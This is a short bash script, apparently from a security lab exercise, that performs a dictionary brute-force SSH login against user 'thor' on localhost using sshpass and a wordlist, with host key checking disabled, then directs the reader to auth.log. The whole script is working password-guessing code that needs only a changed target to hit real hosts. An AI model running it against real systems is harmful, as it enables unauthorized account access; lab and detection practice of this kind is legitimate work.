#!/bin/bash
# Dictionary-Based brute-force simulation script
# Author: bilal-moha
# Description: Attempt SSH login using a password list for user 'thor'

TARGET="localhost"
USER="thor"
WORDLIST="scripts/password.txt"

echo "[*] Starting dictionary attack on $USER@$TARGET"

# Check if password file exists
if [[ ! -f "$WORDLIST" ]]; then
    echo "[!] Wordlist $WORDLIST not found. Create it before running."
    exit 1
fi

# Try each password in the wordlist
while read -r pass; do
    echo "[*] Trying password: $pass"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $USER@$TARGET "echo Success with password: $pass" && break
done < "$WORDLIST"

echo "[*] Dictionary attack simulation complete. Check /var/log/auth.log"
